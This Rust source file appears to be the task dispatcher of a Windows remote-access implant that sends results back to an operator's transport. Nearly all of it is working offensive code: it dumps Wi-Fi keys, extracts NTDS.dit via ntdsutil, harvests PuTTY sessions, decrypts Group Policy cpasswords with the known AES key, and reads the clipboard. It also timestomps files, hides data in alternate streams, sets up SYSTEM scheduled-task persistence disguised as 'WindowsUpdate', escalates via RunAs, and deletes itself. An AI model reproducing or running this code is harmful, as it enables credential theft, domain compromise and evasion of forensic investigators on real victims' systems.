#![allow(unused_imports, dead_code, non_snake_case)]
// Utility command dispatcher — supplementary task types for the Rust agent.

use std::process::Command;
use std::os::windows::process::CommandExt;
use crate::transport::{AgentTransport, TaskWire};
use base64::{engine::general_purpose::STANDARD, Engine as _};

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, FILETIME,
};
use windows_sys::Win32::Storage::FileSystem::{
    GetLogicalDrives, GetDriveTypeW,
    CreateFileW, GetFileTime, SetFileTime,
    FindFirstStreamW, FindNextStreamW, FindClose, WIN32_FIND_STREAM_DATA,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::DataExchange::{
    OpenClipboard, CloseClipboard, GetClipboardData,
};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows_sys::Win32::System::Registry::{
    RegOpenKeyExW, RegEnumKeyExW, RegQueryValueExW, RegCloseKey,
    HKEY_CURRENT_USER, KEY_READ,
};

// ── Win32 constant values (avoids type-alias ambiguity across features) ───────
const GENERIC_READ_V:               u32 = 0x80000000;
const FILE_WRITE_ATTRIBUTES_V:      u32 = 0x00000100;
const FILE_SHARE_READ_V:            u32 = 0x00000001;
const OPEN_EXISTING_V:              u32 = 3;
const FILE_FLAG_BACKUP_SEMANTICS_V: u32 = 0x02000000;

// ── Shell helpers (private in commands.rs — need local copies) ────────────────

fn shell(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Glob matching ─────────────────────────────────────────────────────────────

fn glob_match(pattern: &str, name: &str) -> bool {
    if pattern.is_empty() { return true; }
    if !pattern.contains('*') {
        return name.eq_ignore_ascii_case(pattern);
    }
    let nl = name.to_ascii_lowercase();
    let pl = pattern.to_ascii_lowercase();
    if pl == "*" { return true; }
    // suffix only: "*.txt"
    if let Some(stripped) = pl.strip_prefix('*') {
        if !stripped.contains('*') {
            return nl.ends_with(stripped);
        }
    }
    // prefix only: "foo*"
    if let Some(stripped) = pl.strip_suffix('*') {
        if !stripped.contains('*') {
            return nl.starts_with(stripped);
        }
    }
    // "pre*suf" — split on first star
    if let Some(pos) = pl.find('*') {
        let pre = &pl[..pos];
        let suf = &pl[pos + 1..];
        if !suf.contains('*') {
            return nl.starts_with(pre)
                && nl.ends_with(suf)
                && nl.len() >= pre.len() + suf.len();
        }
    }
    // last resort: name contains all non-star text
    nl.contains(pl.trim_matches('*'))
}

fn search_recursive(dir: &std::path::Path, pattern: &str, max: usize, out: &mut Vec<String>) {
    if out.len() >= max { return; }
    let rd = match std::fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return,
    };
    for entry in rd.flatten() {
        if out.len() >= max { break; }
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if path.is_dir() {
            search_recursive(&path, pattern, max, out);
        } else if glob_match(pattern, &name) {
            out.push(path.to_string_lossy().into_owned());
        }
    }
}

fn search_files(root: &str, pattern: &str, max: usize) -> String {
    let mut results = Vec::new();
    search_recursive(std::path::Path::new(root), pattern, max, &mut results);
    if results.is_empty() { "[no matches]".into() } else { results.join("\n") }
}

// ── Logical drive enumeration ─────────────────────────────────────────────────

fn drives_list() -> String {
    unsafe {
        let mask = GetLogicalDrives();
        let mut out = String::new();
        for i in 0u32..26 {
            if mask & (1 << i) != 0 {
                let letter = (b'A' + i as u8) as char;
                let path_str = format!("{}:\\", letter);
                let path_w = wide(&path_str);
                let dt = GetDriveTypeW(path_w.as_ptr());
                let kind = match dt {
                    0 => "Unknown",
                    1 => "NoRoot",
                    2 => "Removable",
                    3 => "Fixed",
                    4 => "Remote",
                    5 => "CDROM",
                    6 => "RamDisk",
                    _ => "Unknown",
                };
                out.push_str(&format!("{}:\\ [{}]\n", letter, kind));
            }
        }
        if out.is_empty() { "[no drives]".into() } else { out }
    }
}

// ── Process list as JSON ──────────────────────────────────────────────────────

fn ps_json() -> String {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return "[{\"error\":\"snapshot failed\"}]".into();
        }
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let mut entries: Vec<String> = Vec::new();
        if Process32First(snap, &mut pe) != 0 {
            loop {
                let end = pe.szExeFile.iter().position(|&b| b == 0)
                    .unwrap_or(pe.szExeFile.len());
                let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
                let name_j = name.replace('\\', "\\\\").replace('"', "\\\"");
                entries.push(format!(
                    "{{\"pid\":{},\"name\":\"{}\",\"ppid\":{}}}",
                    pe.th32ProcessID, name_j, pe.th32ParentProcessID
                ));
                if Process32Next(snap, &mut pe) == 0 { break; }
            }
        }
        CloseHandle(snap);
        format!("[{}]", entries.join(","))
    }
}

// ── Directory listing as JSON ─────────────────────────────────────────────────

fn ls_json(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(rd) => {
            let items: Vec<String> = rd.flatten().map(|e| {
                let nm = e.file_name().to_string_lossy().into_owned();
                let nm_j = nm.replace('\\', "\\\\").replace('"', "\\\"");
                let is_dir = e.path().is_dir();
                let meta = e.metadata().ok();
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                let mtime = meta.as_ref()
                    .and_then(|m| m.modified().ok())
                    .map(|t| {
                        t.duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs()
                    })
                    .unwrap_or(0);
                format!(
                    "{{\"name\":\"{}\",\"size\":{},\"is_dir\":{},\"modified\":{}}}",
                    nm_j, size, is_dir, mtime
                )
            }).collect();
            format!("[{}]", items.join(","))
        }
        Err(e) => format!("[{{\"error\":\"{}\"}}]", e),
    }
}

// ── Timestamp helpers for TIMESTOMP ──────────────────────────────────────────

fn is_leap_year(y: i64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0)
}

fn date_to_unix_secs(year: i64, month: i64, day: i64, hour: i64, min: i64, sec: i64) -> i64 {
    const DIM: [i64; 12] = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut days = 0i64;
    if year >= 1970 {
        for y in 1970..year { days += if is_leap_year(y) { 366 } else { 365 }; }
    } else {
        for y in year..1970 { days -= if is_leap_year(y) { 366 } else { 365 }; }
    }
    for m in 1..month {
        days += DIM[(m - 1) as usize];
        if m == 2 && is_leap_year(year) { days += 1; }
    }
    days += day - 1;
    days * 86400 + hour * 3600 + min * 60 + sec
}

fn datetime_to_filetime(s: &str) -> Option<FILETIME> {
    let s = s.trim();
    if s.len() < 19 { return None; }
    let year:  i64 = s[0..4].parse().ok()?;
    let month: i64 = s[5..7].parse().ok()?;
    let day:   i64 = s[8..10].parse().ok()?;
    let hour:  i64 = s[11..13].parse().ok()?;
    let min:   i64 = s[14..16].parse().ok()?;
    let sec:   i64 = s[17..19].parse().ok()?;
    let unix = date_to_unix_secs(year, month, day, hour, min, sec);
    let ft = (unix + 11_644_473_600i64) * 10_000_000i64;
    if ft < 0 { return None; }
    Some(FILETIME {
        dwLowDateTime:  (ft & 0xFFFF_FFFF) as u32,
        dwHighDateTime: ((ft >> 32) & 0xFFFF_FFFF) as u32,
    })
}

// ── TIMESTOMP implementation ──────────────────────────────────────────────────

unsafe fn timestomp(
    target: &str,
    ref_path: Option<&str>,
    created_s: Option<&str>,
    modified_s: Option<&str>,
) -> String {
    let (c, a, m) = if let Some(rp) = ref_path {
        let rw = wide(rp);
        let hr = CreateFileW(
            rw.as_ptr(), GENERIC_READ_V, FILE_SHARE_READ_V,
            std::ptr::null(), OPEN_EXISTING_V, FILE_FLAG_BACKUP_SEMANTICS_V, 0,
        );
        if hr == INVALID_HANDLE_VALUE {
            return format!("open ref failed (err {})", GetLastError());
        }
        let mut fc: FILETIME = std::mem::zeroed();
        let mut fa: FILETIME = std::mem::zeroed();
        let mut fm: FILETIME = std::mem::zeroed();
        GetFileTime(hr, &mut fc, &mut fa, &mut fm);
        CloseHandle(hr);
        (fc, fa, fm)
    } else {
        let zero = FILETIME { dwLowDateTime: 0, dwHighDateTime: 0 };
        let fc = created_s.and_then(|s| datetime_to_filetime(s)).unwrap_or(zero);
        let fm = modified_s.and_then(|s| datetime_to_filetime(s)).unwrap_or(fc);
        (fc, fc, fm)
    };

    let tw = wide(target);
    let ht = CreateFileW(
        tw.as_ptr(), FILE_WRITE_ATTRIBUTES_V, FILE_SHARE_READ_V,
        std::ptr::null(), OPEN_EXISTING_V, FILE_FLAG_BACKUP_SEMANTICS_V, 0,
    );
    if ht == INVALID_HANDLE_VALUE {
        return format!("open target failed (err {})", GetLastError());
    }
    let ok = SetFileTime(ht, &c, &a, &m);
    CloseHandle(ht);
    if ok == 0 { format!("SetFileTime failed (err {})", GetLastError()) }
    else { "[+] timestamps updated".to_string() }
}

// ── ADS stream listing ────────────────────────────────────────────────────────

unsafe fn ads_list_streams(path: &str) -> String {
    let pw = wide(path);
    let mut data: WIN32_FIND_STREAM_DATA = std::mem::zeroed();
    // FindStreamInfoStandard = 0i32
    let h = FindFirstStreamW(pw.as_ptr(), 0, &mut data as *mut WIN32_FIND_STREAM_DATA as *mut _, 0);
    if h == INVALID_HANDLE_VALUE {
        return format!("[error listing streams (err {})]", GetLastError());
    }
    let mut out = String::new();
    loop {
        let end = data.cStreamName.iter().position(|&c| c == 0)
            .unwrap_or(data.cStreamName.len());
        let name = String::from_utf16_lossy(&data.cStreamName[..end]);
        out.push_str(&format!("{} ({} bytes)\n", name, data.StreamSize));
        if FindNextStreamW(h, &mut data as *mut WIN32_FIND_STREAM_DATA as *mut _) == 0 {
            break;
        }
    }
    FindClose(h);
    if out.is_empty() { "[no alternate streams]".into() } else { out }
}

// ── Clipboard read ────────────────────────────────────────────────────────────

fn clip_get() -> String {
    const CF_TEXT: u32 = 1;
    unsafe {
        if OpenClipboard(0) == 0 {
            return format!("[OpenClipboard failed (err {})]", GetLastError());
        }
        let h = GetClipboardData(CF_TEXT);
        if h == 0 {
            CloseClipboard();
            return "[clipboard empty or not text]".into();
        }
        let hmem = h as *mut core::ffi::c_void;
        let ptr = GlobalLock(hmem) as *const u8;
        let result = if ptr.is_null() {
            "[GlobalLock failed]".into()
        } else {
            let mut len = 0usize;
            while *ptr.add(len) != 0 { len += 1; }
            let s = std::slice::from_raw_parts(ptr, len);
            String::from_utf8_lossy(s).into_owned()
        };
        if !ptr.is_null() { GlobalUnlock(hmem); }
        CloseClipboard();
        result
    }
}

// ── Wi-Fi credential dump ─────────────────────────────────────────────────────

fn cred_wifi() -> String {
    // Enumerate profiles
    let profiles_out = match std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
    {
        Ok(o) => String::from_utf8_lossy(&o.stdout).into_owned(),
        Err(e) => return format!("[netsh error: {}]", e),
    };

    // Extract profile names from lines like: "    All User Profile     : ProfileName"
    let names: Vec<String> = profiles_out
        .lines()
        .filter_map(|l| {
            let l = l.trim();
            if let Some(pos) = l.find(':') {
                let key = l[..pos].trim().to_ascii_lowercase();
                if key.contains("profile") {
                    let name = l[pos + 1..].trim().to_string();
                    if !name.is_empty() { return Some(name); }
                }
            }
            None
        })
        .collect();

    if names.is_empty() {
        return "[no Wi-Fi profiles found]".into();
    }

    let mut out = String::new();
    for name in &names {
        out.push_str(&format!("\n=== {} ===\n", name));
        match std::process::Command::new("netsh")
            .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
            .output()
        {
            Ok(o) => out.push_str(&String::from_utf8_lossy(&o.stdout)),
            Err(e) => out.push_str(&format!("[error: {}]\n", e)),
        }
    }
    out
}

// ── NTDS dump via ntdsutil ────────────────────────────────────────────────────

fn ntds_dump(dest_path: &str) -> String {
    let dest = if dest_path.is_empty() {
        "C:\\Windows\\Temp\\ntds_ifm"
    } else {
        dest_path
    };
    // ntdsutil "ac i ntds" "ifm" "create full <path>" q q
    match std::process::Command::new("ntdsutil.exe")
        .args([
            "\"ac i ntds\"",
            "\"ifm\"",
            &format!("\"create full {}\"", dest),
            "q",
            "q",
        ])
        .output()
    {
        Ok(o) => {
            let mut r = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { r.push_str(&e); }
            if r.trim().is_empty() {
                format!("[+] ntds dump attempted to {}; check path for files", dest)
            } else {
                r
            }
        }
        Err(e) => format!("[ntdsutil error: {}]", e),
    }
}

// ── PuTTY session harvester ───────────────────────────────────────────────────

fn session_gopher() -> String {
    let base_path_w = wide("Software\\SimonTatham\\PuTTY\\Sessions");
    let mut hbase: isize = 0;

    unsafe {
        let rc = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            base_path_w.as_ptr(),
            0,
            KEY_READ,
            &mut hbase,
        );
        if rc != 0 {
            return "[no PuTTY sessions (registry key not found)]".into();
        }

        let mut out = String::new();
        let mut idx = 0u32;

        loop {
            let mut name_buf = [0u16; 512];
            let mut name_len = 512u32;
            let rc2 = RegEnumKeyExW(
                hbase, idx,
                name_buf.as_mut_ptr(), &mut name_len,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );
            if rc2 != 0 { break; }
            idx += 1;

            let session_name = String::from_utf16_lossy(&name_buf[..name_len as usize]);

            // Open session subkey under HKCU\...\Sessions\<name>
            let sub_path = format!(
                "Software\\SimonTatham\\PuTTY\\Sessions\\{}",
                session_name
            );
            let sub_path_w = wide(&sub_path);
            let mut hsub: isize = 0;
            if RegOpenKeyExW(
                HKEY_CURRENT_USER,
                sub_path_w.as_ptr(),
                0,
                KEY_READ,
                &mut hsub,
            ) != 0 {
                continue;
            }

            out.push_str(&format!("\n[{}]\n", session_name));

            for field in &["HostName", "UserName", "PortNumber", "Protocol"] {
                let field_w = wide(field);
                let mut val_type = 0u32;
                let mut val_data = [0u8; 1024];
                let mut val_size = 1024u32;
                if RegQueryValueExW(
                    hsub,
                    field_w.as_ptr(),
                    std::ptr::null_mut(),
                    &mut val_type,
                    val_data.as_mut_ptr(),
                    &mut val_size,
                ) == 0 {
                    // REG_SZ = 1, REG_DWORD = 4
                    let val: String = if val_type == 1 && val_size >= 2 {
                        let words: Vec<u16> = val_data[..val_size as usize]
                            .chunks_exact(2)
                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
                            .collect();
                        String::from_utf16_lossy(&words)
                            .trim_end_matches('\0')
                            .to_string()
                    } else if val_type == 4 && val_size >= 4 {
                        u32::from_le_bytes([
                            val_data[0], val_data[1], val_data[2], val_data[3],
                        ])
                        .to_string()
                    } else {
                        String::from_utf8_lossy(&val_data[..val_size as usize]).into_owned()
                    };
                    out.push_str(&format!("  {} = {}\n", field, val));
                }
            }
            RegCloseKey(hsub);
        }

        RegCloseKey(hbase);
        if out.trim().is_empty() {
            "[no PuTTY sessions found]".into()
        } else {
            out
        }
    }
}

// ── Main dispatch ─────────────────────────────────────────────────────────────

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        // ── GETPID ────────────────────────────────────────────────────────────
        "GETPID" => {
            t.send_result(task.id, &std::process::id().to_string(), "");
            true
        }

        // ── DRIVES ───────────────────────────────────────────────────────────
        "DRIVES" => {
            t.send_result(task.id, &drives_list(), "");
            true
        }

        // ── NET_SHARES ───────────────────────────────────────────────────────
        "NET_SHARES" => {
            t.send_result(task.id, &shell("net share 2>&1"), "");
            true
        }

        // ── SEARCH ───────────────────────────────────────────────────────────
        "SEARCH" => {
            let (root, pattern, max) = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                let r = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\").to_string();
                let p = j.get("pattern").and_then(|v| v.as_str()).unwrap_or("*").to_string();
                let m = j.get("max_results").and_then(|v| v.as_u64()).unwrap_or(100) as usize;
                (r, p, m)
            } else {
                ("C:\\".to_string(), task.args.trim().to_string(), 100usize)
            };
            t.send_result(task.id, &search_files(&root, &pattern, max), "");
            true
        }

        // ── TIMESTOMP ────────────────────────────────────────────────────────
        "TIMESTOMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let target = match j.get("path").and_then(|v| v.as_str()) {
                Some(p) if !p.is_empty() => p.to_string(),
                _ => {
                    t.send_result(task.id, "", "TIMESTOMP requires {\"path\":\"...\"}");
                    return true;
                }
            };
            let ref_path = j.get("ref").and_then(|v| v.as_str());
            let created  = j.get("created").and_then(|v| v.as_str());
            let modified = j.get("modified").and_then(|v| v.as_str());
            if ref_path.is_none() && created.is_none() && modified.is_none() {
                t.send_result(task.id, "", "TIMESTOMP requires 'ref' or 'created'/'modified'");
                return true;
            }
            let out = unsafe { timestomp(&target, ref_path, created, modified) };
            t.send_result(task.id, &out, "");
            true
        }

        // ── CLEANUP ──────────────────────────────────────────────────────────
        "CLEANUP" => {
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_path = exe.to_string_lossy().into_owned();
            let cmd_str = format!("ping -n 2 127.0.0.1 > nul && del \"{}\" 2>nul", exe_path);
            t.send_result(task.id, "[+] cleanup scheduled", "");
            Command::new("cmd")
                .args(["/c", &cmd_str])
                .creation_flags(0x00000008) // DETACHED_PROCESS
                .spawn()
                .ok();
            std::process::exit(0);
        }

        // ── PS_JSON ──────────────────────────────────────────────────────────
        "PS_JSON" => {
            t.send_result(task.id, &ps_json(), "");
            true
        }

        // ── LS_JSON ──────────────────────────────────────────────────────────
        "LS_JSON" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            t.send_result(task.id, &ls_json(&path), "");
            true
        }

        // ── ELEVATE ──────────────────────────────────────────────────────────
        // Uses PowerShell Start-Process -Verb RunAs to avoid Win32_UI_Shell dependency
        "ELEVATE" => {
            let exe_path = if task.args.trim().is_empty() {
                std::env::current_exe()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned()
            } else {
                task.args.trim().to_string()
            };
            let escaped = exe_path.replace('\'', "''");
            let script = format!(
                "try {{ $p=Start-Process '{}' -Verb RunAs -PassThru -EA Stop; $p.Id }} \
                 catch {{ $_.Exception.Message }}",
                escaped
            );
            t.send_result(task.id, &ps(&script), "");
            true
        }

        // ── WIFI_CREDS ───────────────────────────────────────────────────────
        "WIFI_CREDS" => {
            let script = concat!(
                "(netsh wlan show profiles) -match 'All User Profile' -replace '.*: ','' | ",
                "ForEach-Object { $p=$_; ",
                "$k=(netsh wlan show profile name=$p key=clear | ",
                "Select-String 'Key Content') -replace '.*: ',''; ",
                "\"$p : $k\" }"
            );
            t.send_result(task.id, &ps(script), "");
            true
        }

        // ── GEN_LNK ──────────────────────────────────────────────────────────
        "GEN_LNK" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path   = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let target = j.get("target").and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\cmd.exe");
            let args   = j.get("args").and_then(|v| v.as_str()).unwrap_or("");
            let icon   = j.get("icon").and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\shell32.dll,0");
            if path.is_empty() {
                t.send_result(task.id, "", "GEN_LNK requires {\"path\":\"...\"}");
                return true;
            }
            let script = format!(
                "$s=(New-Object -COM WScript.Shell).CreateShortcut('{p}');\
                 $s.TargetPath='{t}';$s.Arguments='{a}';$s.IconLocation='{i}';$s.Save()",
                p = path.replace('\'', "''"),
                t = target.replace('\'', "''"),
                a = args.replace('\'', "''"),
                i = icon.replace('\'', "''"),
            );
            t.send_result(task.id, &ps(&script), "");
            true
        }

        // ── PERSIST_TASK ─────────────────────────────────────────────────────
        "PERSIST_TASK" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name     = j.get("name").and_then(|v| v.as_str()).unwrap_or("WindowsUpdate");
            let cmd      = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let user     = j.get("user").and_then(|v| v.as_str()).unwrap_or("SYSTEM");
            let trigger  = j.get("trigger").and_then(|v| v.as_str()).unwrap_or("ONLOGON");
            let interval = j.get("interval").and_then(|v| v.as_u64()).unwrap_or(0);
            if cmd.is_empty() {
                t.send_result(task.id, "", "PERSIST_TASK requires cmd");
                return true;
            }
            let sc = if trigger.eq_ignore_ascii_case("DAILY") && interval > 0 {
                format!("/sc MINUTE /mo {}", interval)
            } else if trigger.eq_ignore_ascii_case("ONSTART") {
                "/sc ONSTART".to_string()
            } else {
                "/sc ONLOGON".to_string()
            };
            let full = format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /ru {} {} /f 2>&1",
                name, cmd, user, sc
            );
            t.send_result(task.id, &shell(&full), "");
            true
        }

        // ── ADS_WRITE ────────────────────────────────────────────────────────
        "ADS_WRITE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let data = j.get("data").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_WRITE requires path");
                return true;
            }
            let bytes = match STANDARD.decode(data) {
                Ok(b) => b,
                Err(e) => {
                    t.send_result(task.id, "", &format!("base64 decode: {}", e));
                    return true;
                }
            };
            match std::fs::write(&path, &bytes) {
                Ok(_)  => t.send_result(task.id,
                    &format!("[+] wrote {} bytes to {}", bytes.len(), path), ""),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
            true
        }

        // ── ADS_READ ─────────────────────────────────────────────────────────
        "ADS_READ" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_READ requires path");
                return true;
            }
            match std::fs::read_to_string(&path) {
                Ok(s)  => t.send_result(task.id, &s, ""),
                Err(_) => match std::fs::read(&path) {
                    Ok(b)  => t.send_result(task.id, &STANDARD.encode(&b), ""),
                    Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
                },
            }
            true
        }

        // ── ADS_LIST ─────────────────────────────────────────────────────────
        "ADS_LIST" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_LIST requires path");
                return true;
            }
            let out = unsafe { ads_list_streams(&path) };
            t.send_result(task.id, &out, "");
            true
        }

        // ── ADS_DEL ──────────────────────────────────────────────────────────
        "ADS_DEL" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_DEL requires path");
                return true;
            }
            match std::fs::remove_file(&path) {
                Ok(_)  => t.send_result(task.id, "[+] stream deleted", ""),
                Err(e) => t.send_result(task.id, "", &format!("delete: {}", e)),
            }
            true
        }

        // ── CLIP_GET ─────────────────────────────────────────────────────────
        "CLIP_GET" => {
            t.send_result(task.id, &clip_get(), "");
            true
        }

        // ── CRED_WIFI ────────────────────────────────────────────────────────
        "CRED_WIFI" => {
            t.send_result(task.id, &cred_wifi(), "");
            true
        }

        // ── NTDS_DUMP ────────────────────────────────────────────────────────
        "NTDS_DUMP" => {
            let dest = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            t.send_result(task.id, &ntds_dump(&dest), "");
            true
        }

        // ── SESSION_GOPHER ───────────────────────────────────────────────────
        "SESSION_GOPHER" | "SESSION_CREDS" => {
            t.send_result(task.id, &session_gopher(), "");
            true
        }

        // ── GPP_HUNT ─────────────────────────────────────────────────────────
        "GPP_HUNT" | "GPP_PASSWORDS" => {
            t.send_result(task.id, &gpp_hunt(), "");
            true
        }

        _ => false,
    }
}

// ── GPP password hunt ─────────────────────────────────────────────────────────

fn gpp_hunt() -> String {
    let xml_list = shell("dir /s /b %LOGONSERVER%\\SYSVOL\\*.xml 2>nul");
    if xml_list.trim().is_empty() {
        return "no .xml files found in SYSVOL".to_string();
    }
    let mut output = String::new();
    for line in xml_list.lines() {
        let f = line.trim();
        if f.is_empty() { continue; }
        let content = match std::fs::read_to_string(f) {
            Ok(c) => c,
            Err(_) => continue,
        };
        if let Some(cp_idx) = content.find("cpassword=\"") {
            let start = cp_idx + 11;
            if let Some(end_off) = content[start..].find('"') {
                let cpass = &content[start..start + end_off];
                if cpass.is_empty() { continue; }
                let ps_script = format!(
                    "$k=[byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,\
                     0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,\
                     0x09,0xa4,0x33,0xb6,0x6c,0x1b);\
                     try{{$d=[Convert]::FromBase64String('{cp}');\
                     $a=[Security.Cryptography.AesManaged]::new();\
                     $a.Key=$k;$a.IV=New-Object byte[] 16;$a.Mode='CBC';$a.Padding='Zeros';\
                     $dc=$a.CreateDecryptor();\
                     $pt=$dc.TransformFinalBlock($d,0,$d.Length);\
                     [Text.Encoding]::Unicode.GetString($pt).TrimEnd([char]0)}}catch{{\"[decrypt failed]\"}}",
                    cp = cpass
                );
                let dec = ps(&ps_script);
                output.push_str(&format!(
                    "file: {}\ncpassword: {}\nplaintext: {}\n\n",
                    f, cpass, dec.trim()
                ));
            }
        }
    }
    if output.is_empty() { "no cpasswords found".to_string() } else { output }
}
